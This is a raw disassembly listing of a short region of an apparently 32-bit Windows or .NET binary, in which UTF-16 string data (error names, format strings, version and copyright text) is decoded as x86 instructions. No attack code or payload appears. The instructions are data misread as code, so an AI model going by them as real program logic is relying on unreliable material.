  408d62:	outs   dx,DWORD PTR ds:[esi]
  408d63:	add    BYTE PTR [edx+0x0],dh
  408d66:	push   ebx
  408d67:	add    BYTE PTR [ecx+0x0],ah
  408d6a:	jbe    0x408d6c
  408d6c:	imul   eax,DWORD PTR [eax],0x67006e
  408d72:	push   esp
  408d73:	add    BYTE PTR [ecx+0x0],bh
  408d76:	jo     0x408d78
  408d78:	add    BYTE PTR gs:[eax+eax*1+0x69],cl
  408d7d:	add    BYTE PTR [edx+0x0],ah
  408d80:	add    BYTE PTR [edi],ah
  408d82:	inc    ebp
  408d83:	add    BYTE PTR [edx+0x0],dh
  408d86:	jb     0x408d88
  408d88:	pop    edi
  408d89:	add    BYTE PTR [eax+eax*1+0x79],dl
  408d8d:	add    BYTE PTR [eax+0x0],dh
  408d90:	add    BYTE PTR gs:[eax+eax*1+0x69],cl
  408d95:	add    BYTE PTR [edx+0x0],ah
  408d98:	dec    esp
  408d99:	add    BYTE PTR [edi+0x0],ch
  408d9c:	popa   
  408d9d:	add    BYTE PTR [eax+eax*1+0x44],ah
  408da1:	add    BYTE PTR [ebp+0x0],dh
  408da4:	jo     0x408da6
  408da6:	ins    BYTE PTR es:[edi],dx
  408da7:	add    BYTE PTR [eax],al
  408da9:	pop    es
  408daa:	sub    BYTE PTR [eax],al
  408dac:	xor    BYTE PTR [eax],al
  408dae:	js     0x408db0
  408db0:	add    BYTE PTR ds:0x380058,al
  408db6:	add    BYTE PTR [edi],al
  408db8:	sub    DWORD PTR [eax],eax
  408dba:	cmp    al,BYTE PTR [eax]
  408dbc:	and    BYTE PTR [eax],al
  408dbe:	add    BYTE PTR [edi],bl
  408dc0:	inc    ebp
  408dc1:	add    BYTE PTR [edx+0x0],dh
  408dc4:	jb     0x408dc6
  408dc6:	pop    edi
  408dc7:	add    BYTE PTR [eax+eax*1+0x79],dl
  408dcb:	add    BYTE PTR [eax+0x0],dh
  408dce:	add    BYTE PTR gs:[eax+eax*1+0x69],cl
  408dd3:	add    BYTE PTR [edx+0x0],ah
  408dd6:	dec    esp
  408dd7:	add    BYTE PTR [edi+0x0],ch
  408dda:	popa   
  408ddb:	add    BYTE PTR [eax+eax*1+0x0],ah
  408ddf:	add    eax,0x20003a
  408de4:	add    BYTE PTR [edi],bl
  408de6:	dec    ebp
  408de7:	add    BYTE PTR [ebx+0x0],dh
  408dea:	add    BYTE PTR [bx+0x0],bl
  408dee:	dec    esi
  408def:	add    BYTE PTR [edi+0x0],ch
  408df2:	outs   dx,BYTE PTR ds:[esi]
  408df3:	add    BYTE PTR [eax+eax*1+0x6c],dl
  408df7:	add    BYTE PTR [edx+0x0],ah
  408dfa:	inc    esi
  408dfb:	add    BYTE PTR [edi+0x0],ch
  408dfe:	jne    0x408e00
  408e00:	outs   dx,BYTE PTR ds:[esi]
  408e01:	add    BYTE PTR [eax+eax*1+0x0],ah
  408e05:	and    eax,0x73004d
  408e0a:	add    BYTE PTR [bx+0x0],bl
  408e0e:	push   edx
  408e0f:	add    BYTE PTR [ebp+0x0],ah
  408e12:	data16 add BYTE PTR [eax+eax*1+0x6c],dl
  408e17:	add    BYTE PTR [edx+0x0],ah
  408e1a:	dec    ebp
  408e1b:	add    BYTE PTR [ecx+0x0],ch
  408e1e:	jae    0x408e20
  408e20:	ins    DWORD PTR es:[edi],dx
  408e21:	add    BYTE PTR [ecx+0x0],ah
  408e24:	je     0x408e26
  408e26:	arpl   WORD PTR [eax],ax
  408e28:	push   0x7b030000
  408e2d:	add    BYTE PTR [eax],al
  408e2f:	add    edi,DWORD PTR [ebp+0x0]
  408e32:	add    BYTE PTR [ebx],al
  408e34:	add    BYTE PTR cs:[eax],al
  408e37:	add    DWORD PTR [eax],eax
  408e39:	xor    DWORD PTR [ebp+0x0],ecx
  408e3c:	jae    0x408e3e
  408e3e:	add    BYTE PTR [bx+0x0],bl
  408e42:	push   edx
  408e43:	add    BYTE PTR [ebp+0x0],ah
  408e46:	jae    0x408e48
  408e48:	outs   dx,DWORD PTR ds:[esi]
  408e49:	add    BYTE PTR [eax+eax*1+0x76],ch
  408e4d:	add    BYTE PTR [ebp+0x0],ah
  408e50:	push   edx
  408e51:	add    BYTE PTR [ebp+0x0],ah
  408e54:	data16 add BYTE PTR [eax+eax*1+0x6c],dl
  408e59:	add    BYTE PTR [edx+0x0],ah
  408e5c:	push   ebx
  408e5d:	add    BYTE PTR [eax+eax*1+0x61],dh
  408e61:	add    BYTE PTR [edx+0x0],dh
  408e64:	je     0x408e66
  408e66:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  408e6b:	daa    
  408e6c:	inc    ebp
  408e6d:	add    BYTE PTR [edx+0x0],dh
  408e70:	jb     0x408e72
  408e72:	pop    edi
  408e73:	add    BYTE PTR [edx+0x0],dl
  408e76:	add    BYTE PTR gs:[esi+0x0],ah
  408e7a:	push   esp
  408e7b:	add    BYTE PTR [eax+eax*1+0x62],ch
  408e7f:	add    BYTE PTR [esi+0x0],cl
  408e82:	outs   dx,DWORD PTR ds:[esi]
  408e83:	add    BYTE PTR [eax+eax*1+0x49],dh
  408e87:	add    BYTE PTR [esi+0x0],ch
  408e8a:	dec    esp
  408e8b:	add    BYTE PTR [ecx+0x0],ch
  408e8e:	jae    0x408e90
  408e90:	je     0x408e92
  408e92:	add    BYTE PTR ds:0x73004d,ah
  408e98:	add    BYTE PTR [bx+0x0],bl
  408e9c:	push   edx
  408e9d:	add    BYTE PTR [ebp+0x0],ah
  408ea0:	data16 add BYTE PTR [eax+eax*1+0x6c],dl
  408ea5:	add    BYTE PTR [edx+0x0],ah
  408ea8:	push   edx
  408ea9:	add    BYTE PTR [ebp+0x0],ah
  408eac:	jae    0x408eae
  408eae:	outs   dx,DWORD PTR ds:[esi]
  408eaf:	add    BYTE PTR [eax+eax*1+0x76],ch
  408eb3:	add    BYTE PTR [ebp+0x0],ah
  408eb6:	add    BYTE PTR fs:[eax],al
  408eb9:	or     DWORD PTR [esi],ebp
  408ebb:	add    BYTE PTR [eax+eax*1+0x6c],ah
  408ebf:	add    BYTE PTR [eax+eax*1+0x0],ch
  408ec3:	sub    DWORD PTR [ebx+0x0],eax
  408ec6:	jne    0x408ec8
  408ec8:	jae    0x408eca
  408eca:	je     0x408ecc
  408ecc:	outs   dx,DWORD PTR ds:[esi]
  408ecd:	add    BYTE PTR [ebp+0x0],ch
  408ed0:	dec    ebp
  408ed1:	add    BYTE PTR [ecx+0x0],ah
  408ed4:	jb     0x408ed6
  408ed6:	jae    0x408ed8
  408ed8:	push   0x6c006100
  408edd:	add    BYTE PTR [ebp+0x0],ah
  408ee0:	jb     0x408ee2
  408ee2:	jae    0x408ee4
  408ee4:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  408ee9:	add    BYTE PTR [eax+eax*1+0x0],ch
  408eed:	cmp    eax,0x73004d
  408ef2:	add    BYTE PTR [bx+0x0],bl
  408ef6:	push   ebp
  408ef7:	add    BYTE PTR [esi+0x0],ch
  408efa:	imul   eax,DWORD PTR [eax],0x6e
  408efd:	add    BYTE PTR [edi+0x0],ch
  408f00:	ja     0x408f02
  408f02:	outs   dx,BYTE PTR ds:[esi]
  408f03:	add    BYTE PTR [ebx+0x0],al
  408f06:	jne    0x408f08
  408f08:	jae    0x408f0a
  408f0a:	je     0x408f0c
  408f0c:	outs   dx,DWORD PTR ds:[esi]
  408f0d:	add    BYTE PTR [ebp+0x0],ch
  408f10:	dec    ebp
  408f11:	add    BYTE PTR [ecx+0x0],ah
  408f14:	jb     0x408f16
  408f16:	jae    0x408f18
  408f18:	push   0x6c006100
  408f1d:	add    BYTE PTR [ebp+0x0],ah
  408f20:	jb     0x408f22
  408f22:	jae    0x408f24
  408f24:	push   edx
  408f25:	add    BYTE PTR [ebp+0x0],ah
  408f28:	data16 add BYTE PTR [eax],al
  408f2b:	add    ebx,DWORD PTR [eax+eax*1+0x0]
  408f2f:	or     DWORD PTR [esi],ebp
  408f31:	add    BYTE PTR [ebp+0x0],ah
  408f34:	js     0x408f36
  408f36:	add    BYTE PTR gs:[eax],al
  408f39:	sub    eax,0x720045
  408f3e:	jb     0x408f40
  408f40:	pop    edi
  408f41:	add    BYTE PTR [edx+0x0],dl
  408f44:	add    BYTE PTR gs:[esi+0x0],ah
  408f48:	inc    ecx
  408f49:	add    BYTE PTR [ebx+0x0],dh
  408f4c:	ins    DWORD PTR es:[edi],dx
  408f4d:	add    BYTE PTR [esi+0x0],cl
  408f50:	outs   dx,DWORD PTR ds:[esi]
  408f51:	add    BYTE PTR [eax+eax*1+0x49],dh
  408f55:	add    BYTE PTR [esi+0x0],ch
  408f58:	inc    ecx
  408f59:	add    BYTE PTR [ebx+0x0],dh
  408f5c:	ins    DWORD PTR es:[edi],dx
  408f5d:	add    BYTE PTR [eax+0x0],dl
  408f60:	popa   
  408f61:	add    BYTE PTR [eax+eax*1+0x68],dh
  408f65:	add    BYTE PTR [eax],al
  408f67:	das    
  408f68:	dec    ebp
  408f69:	add    BYTE PTR [ebx+0x0],dh
  408f6c:	add    BYTE PTR [bx+0x0],bl
  408f70:	push   edx
  408f71:	add    BYTE PTR [ebp+0x0],ah
  408f74:	data16 add BYTE PTR [ecx+0x0],al
  408f78:	jae    0x408f7a
  408f7a:	ins    DWORD PTR es:[edi],dx
  408f7b:	add    BYTE PTR [edx+0x0],dl
  408f7e:	add    BYTE PTR gs:[ebx+0x0],dh
  408f82:	outs   dx,DWORD PTR ds:[esi]
  408f83:	add    BYTE PTR [eax+eax*1+0x76],ch
  408f87:	add    BYTE PTR [ebp+0x0],ah
  408f8a:	add    BYTE PTR fs:[eax+eax*1+0x6f],dl
  408f8f:	add    BYTE PTR [ecx+0x0],al
  408f92:	jae    0x408f94
  408f94:	ins    DWORD PTR es:[edi],dx
  408f95:	add    BYTE PTR [eax],al
  408f97:	xor    eax,0x73004d
  408f9c:	add    BYTE PTR [bx+0x0],bl
  408fa0:	push   edx
  408fa1:	add    BYTE PTR [ebp+0x0],ah
  408fa4:	jae    0x408fa6
  408fa6:	outs   dx,DWORD PTR ds:[esi]
  408fa7:	add    BYTE PTR [eax+eax*1+0x76],ch
  408fab:	add    BYTE PTR [ebp+0x0],ah
  408fae:	inc    ecx
  408faf:	add    BYTE PTR [ebx+0x0],dh
  408fb2:	ins    DWORD PTR es:[edi],dx
  408fb3:	add    BYTE PTR [eax+eax*1+0x6f],dl
  408fb7:	add    BYTE PTR [eax+eax*1+0x6c],dl
  408fbb:	add    BYTE PTR [edx+0x0],ah
  408fbe:	push   ebx
  408fbf:	add    BYTE PTR [eax+eax*1+0x61],dh
  408fc3:	add    BYTE PTR [edx+0x0],dh
  408fc6:	je     0x408fc8
  408fc8:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  408fcd:	sub    DWORD PTR [ebp+0x0],ecx
  408fd0:	jae    0x408fd2
  408fd2:	add    BYTE PTR [bx+0x0],bl
  408fd6:	inc    ecx
  408fd7:	add    BYTE PTR [ebx+0x0],dh
  408fda:	ins    DWORD PTR es:[edi],dx
  408fdb:	add    BYTE PTR [edx+0x0],dl
  408fde:	add    BYTE PTR gs:[ebx+0x0],dh
  408fe2:	outs   dx,DWORD PTR ds:[esi]
  408fe3:	add    BYTE PTR [eax+eax*1+0x76],ch
  408fe7:	add    BYTE PTR [ebp+0x0],ah
  408fea:	add    BYTE PTR fs:[eax+eax*1+0x6f],dl
  408fef:	add    BYTE PTR [eax+eax*1+0x6c],dl
  408ff3:	add    BYTE PTR [edx+0x0],ah
  408ff6:	add    BYTE PTR [ebx],dh
  408ff8:	inc    ebp
  408ff9:	add    BYTE PTR [edx+0x0],dh
  408ffc:	jb     0x408ffe
  408ffe:	pop    edi
  408fff:	add    BYTE PTR [eax+eax*1+0x6c],dl
  409003:	add    BYTE PTR [edx+0x0],ah
  409006:	inc    esi
  409007:	add    BYTE PTR [edi+0x0],ch
  40900a:	jb     0x40900c
  40900c:	push   edx
  40900d:	add    BYTE PTR [ebp+0x0],ah
  409010:	data16 add BYTE PTR [ecx+0x0],al
  409014:	jae    0x409016
  409016:	ins    DWORD PTR es:[edi],dx
  409017:	add    BYTE PTR [esi+0x0],cl
  40901a:	outs   dx,DWORD PTR ds:[esi]
  40901b:	add    BYTE PTR [eax+eax*1+0x49],dh
  40901f:	add    BYTE PTR [esi+0x0],ch
  409022:	dec    esp
  409023:	add    BYTE PTR [ecx+0x0],ch
  409026:	jae    0x409028
  409028:	je     0x40902a
  40902a:	add    BYTE PTR [ebx],dh
  40902c:	dec    ebp
  40902d:	add    BYTE PTR [ebx+0x0],dh
  409030:	add    BYTE PTR [bx+0x0],bl
  409034:	inc    ecx
  409035:	add    BYTE PTR [ebp+0x0],dh
  409038:	je     0x40903a
  40903a:	outs   dx,DWORD PTR ds:[esi]
  40903b:	add    BYTE PTR [ebp+0x0],al
  40903e:	js     0x409040
  409040:	jo     0x409042
  409042:	outs   dx,DWORD PTR ds:[esi]
  409043:	add    BYTE PTR [edx+0x0],dh
  409046:	je     0x409048
  409048:	imul   eax,DWORD PTR [eax],0x67006e
  40904e:	inc    ecx
  40904f:	add    BYTE PTR [ebx+0x0],dh
  409052:	jae    0x409054
  409054:	add    BYTE PTR gs:[ebp+0x0],ch
  409058:	bound  eax,QWORD PTR [eax]
  40905a:	ins    BYTE PTR es:[edi],dx
  40905b:	add    BYTE PTR [ecx+0x0],bh
  40905e:	add    BYTE PTR [ebx],bh
  409060:	inc    ebp
  409061:	add    BYTE PTR [edx+0x0],dh
  409064:	jb     0x409066
  409066:	pop    edi
  409067:	add    BYTE PTR [edx+0x0],dl
  40906a:	add    BYTE PTR gs:[esi+0x0],ah
  40906e:	push   esp
  40906f:	add    BYTE PTR [eax+eax*1+0x62],ch
  409073:	add    BYTE PTR [edi+0x0],cl
  409076:	jbe    0x409078
  409078:	add    BYTE PTR gs:[edx+0x0],dh
  40907c:	ja     0x40907e
  40907e:	jb     0x409080
  409080:	imul   eax,DWORD PTR [eax],0x740074
  409086:	add    BYTE PTR gs:[esi+0x0],ch
  40908a:	inc    edx
  40908b:	add    BYTE PTR [ecx+0x0],bh
  40908e:	dec    edi
  40908f:	add    BYTE PTR [ebp+0x0],dh
  409092:	je     0x409094
  409094:	jo     0x409096
  409096:	jne    0x409098
  409098:	je     0x40909a
  40909a:	add    BYTE PTR [edi],bh
  40909c:	push   esp
  40909d:	add    BYTE PTR [eax+eax*1+0x62],ch
  4090a1:	add    BYTE PTR [ebp+0x0],al
  4090a4:	js     0x4090a6
  4090a6:	jo     0x4090a8
  4090a8:	and    BYTE PTR [eax],al
  4090aa:	cmp    al,BYTE PTR [eax]
  4090ac:	and    BYTE PTR [eax],al
  4090ae:	add    BYTE PTR gs:[edx+0x0],dh
  4090b2:	jb     0x4090b4
  4090b4:	outs   dx,DWORD PTR ds:[esi]
  4090b5:	add    BYTE PTR [edx+0x0],dh
  4090b8:	and    BYTE PTR [eax],al
  4090ba:	push   esp
  4090bb:	add    BYTE PTR [eax+0x0],bl
  4090be:	jnp    0x4090c0
  4090c0:	xor    DWORD PTR [eax],eax
  4090c2:	cmp    al,BYTE PTR [eax]
  4090c4:	xor    BYTE PTR [eax],al
  4090c6:	xor    BYTE PTR [eax],al
  4090c8:	xor    BYTE PTR [eax],al
  4090ca:	xor    BYTE PTR [eax],al
  4090cc:	jge    0x4090ce
  4090ce:	and    BYTE PTR [eax],al
  4090d0:	cmp    al,BYTE PTR [eax]
  4090d2:	and    BYTE PTR [eax],al
  4090d4:	jnp    0x4090d6
  4090d6:	xor    BYTE PTR [eax],al
  4090d8:	jge    0x4090da
  4090da:	add    BYTE PTR [ecx],bh
  4090dc:	jnp    0x4090de
  4090de:	xor    BYTE PTR [eax],al
  4090e0:	jge    0x4090e2
  4090e2:	and    BYTE PTR [eax],al
  4090e4:	cmp    al,BYTE PTR [eax]
  4090e6:	and    BYTE PTR [eax],al
  4090e8:	add    BYTE PTR gs:[edx+0x0],dh
  4090ec:	jb     0x4090ee
  4090ee:	outs   dx,DWORD PTR ds:[esi]
  4090ef:	add    BYTE PTR [edx+0x0],dh
  4090f2:	and    BYTE PTR [eax],al
  4090f4:	push   esp
  4090f5:	add    BYTE PTR [eax+0x0],bl
  4090f8:	jnp    0x4090fa
  4090fa:	xor    DWORD PTR [eax],eax
  4090fc:	cmp    al,BYTE PTR [eax]
  4090fe:	xor    BYTE PTR [eax],al
  409100:	xor    BYTE PTR [eax],al
  409102:	xor    BYTE PTR [eax],al
  409104:	xor    BYTE PTR [eax],al
  409106:	jge    0x409108
  409108:	and    BYTE PTR [eax],al
  40910a:	cmp    al,BYTE PTR [eax]
  40910c:	and    BYTE PTR [eax],al
  40910e:	jnp    0x409110
  409110:	xor    al,BYTE PTR [eax]
  409112:	jge    0x409114
  409114:	add    BYTE PTR [ecx+0x7b],cl
  409117:	add    BYTE PTR [eax],dh
  409119:	add    BYTE PTR [ebp+0x0],bh
  40911c:	sub    BYTE PTR [eax],al
  40911e:	jnp    0x409120
  409120:	xor    DWORD PTR [eax],eax
  409122:	jge    0x409124
  409124:	sub    al,0x0
  409126:	jnp    0x409128
  409128:	xor    al,BYTE PTR [eax]
  40912a:	jge    0x40912c
  40912c:	sub    DWORD PTR [eax],eax
  40912e:	cmp    al,BYTE PTR [eax]
  409130:	and    BYTE PTR [eax],al
  409132:	add    BYTE PTR gs:[edx+0x0],dh
  409136:	jb     0x409138
  409138:	outs   dx,DWORD PTR ds:[esi]
  409139:	add    BYTE PTR [edx+0x0],dh
  40913c:	and    BYTE PTR [eax],al
  40913e:	push   esp
  40913f:	add    BYTE PTR [eax+0x0],bl
  409142:	jnp    0x409144
  409144:	xor    eax,DWORD PTR [eax]
  409146:	cmp    al,BYTE PTR [eax]
  409148:	xor    BYTE PTR [eax],al
  40914a:	xor    BYTE PTR [eax],al
  40914c:	xor    BYTE PTR [eax],al
  40914e:	xor    BYTE PTR [eax],al
  409150:	jge    0x409152
  409152:	and    BYTE PTR [eax],al
  409154:	cmp    al,BYTE PTR [eax]
  409156:	and    BYTE PTR [eax],al
  409158:	jnp    0x40915a
  40915a:	xor    al,0x0
  40915c:	jge    0x40915e
  40915e:	add    BYTE PTR [ebx],bh
  409160:	push   esp
  409161:	add    BYTE PTR [eax+eax*1+0x62],ch
  409165:	add    BYTE PTR [ebp+0x0],al
  409168:	js     0x40916a
  40916a:	jo     0x40916c
  40916c:	and    BYTE PTR [eax],al
  40916e:	cmp    al,BYTE PTR [eax]
  409170:	and    BYTE PTR [eax],al
  409172:	ja     0x409174
  409174:	popa   
  409175:	add    BYTE PTR [edx+0x0],dh
  409178:	outs   dx,BYTE PTR ds:[esi]
  409179:	add    BYTE PTR [ecx+0x0],ch
  40917c:	outs   dx,BYTE PTR ds:[esi]
  40917d:	add    BYTE PTR [edi+0x0],ah
  409180:	and    BYTE PTR [eax],al
  409182:	push   esp
  409183:	add    BYTE PTR [eax+0x0],bl
  409186:	xor    BYTE PTR [eax],al
  409188:	xor    BYTE PTR [eax],al
  40918a:	xor    BYTE PTR [eax],al
  40918c:	xor    BYTE PTR [eax],al
  40918e:	and    BYTE PTR [eax],al
  409190:	cmp    al,BYTE PTR [eax]
  409192:	and    BYTE PTR [eax],al
  409194:	jnp    0x409196
  409196:	xor    BYTE PTR [eax],al
  409198:	jge    0x40919a
  40919a:	add    BYTE PTR ds:0x30007b,bh
  4091a0:	jge    0x4091a2
  4091a2:	and    BYTE PTR [eax],al
  4091a4:	cmp    al,BYTE PTR [eax]
  4091a6:	and    BYTE PTR [eax],al
  4091a8:	ja     0x4091aa
  4091aa:	popa   
  4091ab:	add    BYTE PTR [edx+0x0],dh
  4091ae:	outs   dx,BYTE PTR ds:[esi]
  4091af:	add    BYTE PTR [ecx+0x0],ch
  4091b2:	outs   dx,BYTE PTR ds:[esi]
  4091b3:	add    BYTE PTR [edi+0x0],ah
  4091b6:	and    BYTE PTR [eax],al
  4091b8:	push   esp
  4091b9:	add    BYTE PTR [eax+0x0],bl
  4091bc:	jnp    0x4091be
  4091be:	xor    DWORD PTR [eax],eax
  4091c0:	cmp    al,BYTE PTR [eax]
  4091c2:	xor    BYTE PTR [eax],al
  4091c4:	xor    BYTE PTR [eax],al
  4091c6:	xor    BYTE PTR [eax],al
  4091c8:	xor    BYTE PTR [eax],al
  4091ca:	jge    0x4091cc
  4091cc:	and    BYTE PTR [eax],al
  4091ce:	cmp    al,BYTE PTR [eax]
  4091d0:	and    BYTE PTR [eax],al
  4091d2:	jnp    0x4091d4
  4091d4:	xor    al,BYTE PTR [eax]
  4091d6:	jge    0x4091d8
  4091d8:	add    BYTE PTR [ebp+0x7b],cl
  4091db:	add    BYTE PTR [eax],dh
  4091dd:	add    BYTE PTR [ebp+0x0],bh
  4091e0:	sub    BYTE PTR [eax],al
  4091e2:	jnp    0x4091e4
  4091e4:	xor    DWORD PTR [eax],eax
  4091e6:	jge    0x4091e8
  4091e8:	sub    al,0x0
  4091ea:	jnp    0x4091ec
  4091ec:	xor    al,BYTE PTR [eax]
  4091ee:	jge    0x4091f0
  4091f0:	sub    DWORD PTR [eax],eax
  4091f2:	cmp    al,BYTE PTR [eax]
  4091f4:	and    BYTE PTR [eax],al
  4091f6:	ja     0x4091f8
  4091f8:	popa   
  4091f9:	add    BYTE PTR [edx+0x0],dh
  4091fc:	outs   dx,BYTE PTR ds:[esi]
  4091fd:	add    BYTE PTR [ecx+0x0],ch
  409200:	outs   dx,BYTE PTR ds:[esi]
  409201:	add    BYTE PTR [edi+0x0],ah
  409204:	and    BYTE PTR [eax],al
  409206:	push   esp
  409207:	add    BYTE PTR [eax+0x0],bl
  40920a:	jnp    0x40920c
  40920c:	xor    eax,DWORD PTR [eax]
  40920e:	cmp    al,BYTE PTR [eax]
  409210:	xor    BYTE PTR [eax],al
  409212:	xor    BYTE PTR [eax],al
  409214:	xor    BYTE PTR [eax],al
  409216:	xor    BYTE PTR [eax],al
  409218:	jge    0x40921a
  40921a:	and    BYTE PTR [eax],al
  40921c:	cmp    al,BYTE PTR [eax]
  40921e:	and    BYTE PTR [eax],al
  409220:	jnp    0x409222
  409222:	xor    al,0x0
  409224:	jge    0x409226
  409226:	add    BYTE PTR [eax],al
  409228:	mov    dh,0x3
  40922a:	sbb    al,0x85
  40922c:	inc    edi
  40922d:	fadd   DWORD PTR [ebx-0x437b75b4]
  409233:	or     al,BYTE PTR [ebx+0x7e]
  409236:	pop    ecx
  409237:	cmp    BYTE PTR [eax],al
  409239:	or     BYTE PTR [edi+0x19565c7a],dh
  40923f:	xor    al,0xe0
  409241:	mov    DWORD PTR [edx],eax
  409243:	push   es
  409244:	push   cs
  409245:	push   cs
  409246:	xor    al,BYTE PTR [eax]
  409248:	add    BYTE PTR cs:[eax],dh
  40924b:	add    BYTE PTR [esi],ch
  40924d:	add    BYTE PTR [eax],dh
  40924f:	add    BYTE PTR [esi],ch
  409251:	add    BYTE PTR [eax],dh
  409253:	add    BYTE PTR [esi],cl
  409255:	xor    eax,DWORD PTR [eax]
  409257:	add    BYTE PTR cs:0x30002e00,dh
  40925e:	add    BYTE PTR [esi],ch
  409260:	add    BYTE PTR [eax],dh
  409262:	add    BYTE PTR [esp+edx*2],dl
  409265:	add    BYTE PTR [eax+eax*1+0x62],ch
  409269:	add    BYTE PTR [ebp+0x0],al
  40926c:	js     0x40926e
  40926e:	jo     0x409270
  409270:	add    BYTE PTR cs:[ebp+0x0],ah
  409274:	js     0x409276
  409276:	add    BYTE PTR gs:[ecx+ebp*4+0x0],bl
  40927b:	and    BYTE PTR [eax],al
  40927d:	dec    ebp
  40927e:	add    BYTE PTR [ecx+0x0],ch
  409281:	arpl   WORD PTR [eax],ax
  409283:	jb     0x409285
  409285:	outs   dx,DWORD PTR ds:[esi]
  409286:	add    BYTE PTR [ebx+0x0],dh
  409289:	outs   dx,DWORD PTR ds:[esi]
  40928a:	add    BYTE PTR [esi+0x0],ah
  40928d:	je     0x40928f
  40928f:	and    BYTE PTR [eax],al
  409291:	inc    ebx
  409292:	add    BYTE PTR [edi+0x0],ch
  409295:	jb     0x409297
  409297:	jo     0x409299
  409299:	outs   dx,DWORD PTR ds:[esi]
  40929a:	add    BYTE PTR [edx+0x0],dh
  40929d:	popa   
  40929e:	add    BYTE PTR [eax+eax*1+0x69],dh
  4092a2:	add    BYTE PTR [edi+0x0],ch
  4092a5:	outs   dx,BYTE PTR ds:[esi]
  4092a6:	add    BYTE PTR [esi],ch
  4092a8:	add    BYTE PTR [eax],ah
  4092aa:	add    BYTE PTR [eax],ah
  4092ac:	add    BYTE PTR [ecx+0x0],al
  4092af:	ins    BYTE PTR es:[edi],dx
  4092b0:	add    BYTE PTR [eax+eax*1+0x20],ch
  4092b4:	add    BYTE PTR [edx+0x0],dh
  4092b7:	imul   eax,DWORD PTR [eax],0x680067
  4092bd:	je     0x4092bf
  4092bf:	jae    0x4092c1
  4092c1:	and    BYTE PTR [eax],al
  4092c3:	jb     0x4092c5
  4092c5:	add    BYTE PTR gs:[ebx+0x0],dh
  4092c9:	add    BYTE PTR gs:[edx+0x0],dh
  4092cd:	jbe    0x4092cf
  4092cf:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  4092d4:	add    BYTE PTR [esi],dl
  4092d6:	xor    eax,DWORD PTR [eax]
  4092d8:	add    BYTE PTR cs:0x33002e00,dh
  4092df:	add    BYTE PTR [eax],dh
  4092e1:	add    BYTE PTR [edi],dh
  4092e3:	add    BYTE PTR [edx],dh
  4092e5:	add    BYTE PTR [ecx],bh
  4092e7:	add    BYTE PTR [esi],ch
  4092e9:	add    BYTE PTR [ecx],dh
  4092eb:	add    BYTE PTR [edx],al
  4092ed:	push   es
  4092ee:	or     BYTE PTR [ecx+ecx*1],al
  4092f1:	js     0x4092f3
  4092f3:	add    BYTE PTR [eax],ah
  4092f5:	bound  eax,QWORD PTR [eax]
  4092f7:	aaa    
  4092f8:	add    BYTE PTR [edi],dh
  4092fa:	add    BYTE PTR [ecx+0x0],ah
  4092fd:	xor    eax,0x35006300
  409302:	add    BYTE PTR [esi],dh
  409304:	add    BYTE PTR [ecx],dh
  409306:	add    BYTE PTR [ecx],bh
  409308:	add    BYTE PTR [ebx],dh
  40930a:	add    BYTE PTR [eax+eax*1],dh
  40930d:	add    BYTE PTR gs:[eax],dh
  409310:	add    BYTE PTR [eax],bh
  409312:	add    BYTE PTR [ecx],bh
  409314:	add    BYTE PTR [eax+0x30],al
  409317:	add    BYTE PTR [eax],dh
  409319:	add    BYTE PTR [eax],dh
  40931b:	add    BYTE PTR [eax],dh
  40931d:	add    BYTE PTR [eax],dh
  40931f:	add    BYTE PTR [eax],dh
  409321:	add    BYTE PTR [eax],dh
  409323:	add    BYTE PTR [eax],dh
  409325:	add    BYTE PTR [eax],dh
  409327:	add    BYTE PTR [eax],dh
  409329:	add    BYTE PTR [eax],dh
  40932b:	add    BYTE PTR [eax],dh
  40932d:	add    BYTE PTR [eax],dh
  40932f:	add    BYTE PTR [eax],dh
  409331:	add    BYTE PTR [eax],dh
  409333:	add    BYTE PTR [eax],dh
  409335:	add    BYTE PTR [eax],dh
  409337:	add    BYTE PTR [eax+eax*1],dh
  40933a:	xor    BYTE PTR [eax],al
  40933c:	xor    BYTE PTR [eax],al
  40933e:	xor    BYTE PTR [eax],al
  409340:	xor    BYTE PTR [eax],al
  409342:	xor    BYTE PTR [eax],al
  409344:	xor    BYTE PTR [eax],al
  409346:	xor    BYTE PTR [eax],al
  409348:	xor    BYTE PTR [eax],al
  40934a:	xor    BYTE PTR [eax],al
  40934c:	xor    BYTE PTR [eax],al
  40934e:	xor    BYTE PTR [eax],al
  409350:	xor    BYTE PTR [eax],al
  409352:	xor    BYTE PTR [eax],al
  409354:	xor    BYTE PTR [eax],al
  409356:	adc    BYTE PTR [esi+0x73006d],0x63
  40935d:	add    BYTE PTR [edi+0x0],ch
  409360:	jb     0x409362
  409362:	ins    BYTE PTR es:[edi],dx
  409363:	add    BYTE PTR [ecx+0x0],ch
  409366:	bound  eax,QWORD PTR [eax]
  409368:	sub    al,0x0
  40936a:	and    BYTE PTR [eax],al
  40936c:	push   esi
  40936d:	add    BYTE PTR [ebp+0x0],ah
  409370:	jb     0x409372
  409372:	jae    0x409374
  409374:	imul   eax,DWORD PTR [eax],0x6e006f
  40937a:	cmp    eax,0x2e003200
  40937f:	add    BYTE PTR [eax],dh
  409381:	add    BYTE PTR [esi],ch
  409383:	add    BYTE PTR [eax],dh
  409385:	add    BYTE PTR [esi],ch
  409387:	add    BYTE PTR [eax],dh
  409389:	add    BYTE PTR [eax+eax*1],ch
  40938c:	and    BYTE PTR [eax],al
  40938e:	inc    ebx
  40938f:	add    BYTE PTR [ebp+0x0],dh
  409392:	ins    BYTE PTR es:[edi],dx
  409393:	add    BYTE PTR [eax+eax*1+0x75],dh
  409397:	add    BYTE PTR [edx+0x0],dh
  40939a:	add    BYTE PTR gs:0x65006e00,bh
  4093a1:	add    BYTE PTR [ebp+0x0],dh
  4093a4:	je     0x4093a6
  4093a6:	jb     0x4093a8
  4093a8:	popa   
  4093a9:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4093ad:	add    BYTE PTR [eax],ah
  4093af:	add    BYTE PTR [eax+0x0],dl
  4093b2:	jne    0x4093b4
  4093b4:	bound  eax,QWORD PTR [eax]
  4093b6:	ins    BYTE PTR es:[edi],dx
  4093b7:	add    BYTE PTR [ecx+0x0],ch
  4093ba:	arpl   WORD PTR [eax],ax
  4093bc:	dec    ebx
  4093bd:	add    BYTE PTR [ebp+0x0],ah
  4093c0:	jns    0x4093c2
  4093c2:	push   esp
  4093c3:	add    BYTE PTR [edi+0x0],ch
  4093c6:	imul   eax,DWORD PTR [eax],0x65
